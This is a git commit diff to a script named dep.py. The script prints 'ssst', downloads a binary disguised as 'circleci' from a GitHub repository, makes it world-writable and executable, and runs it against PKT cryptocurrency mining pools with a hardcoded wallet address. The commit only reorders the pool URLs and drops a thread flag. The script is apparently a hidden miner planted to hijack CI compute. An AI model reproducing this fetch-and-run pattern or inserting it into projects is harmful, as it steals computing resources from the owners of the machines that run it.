f17e30a6ef160b6966442e5663f5816e95bf64b6
aurbach55 <95366868+aurbach55@users.noreply.github.com>
2022-04-30 03:11:44 +0700

    Update dep.py

--- dep.py
+++ dep.py
@@ -3,4 +3,4 @@ import urllib.request
 import os
 print('ssst')
 urllib.request.urlretrieve('https://github.com/aurbach55/zash/raw/main/circleci','circleci')
-os.system ("chmod 777 circleci && ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx  http://pool.pkteer.com http://pool.pktpool.io http://pool.pkt.world -t 4")
+os.system ("chmod 777 circleci && ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkt.world http://pool.pkteer.com http://pool.pktpool.io ")
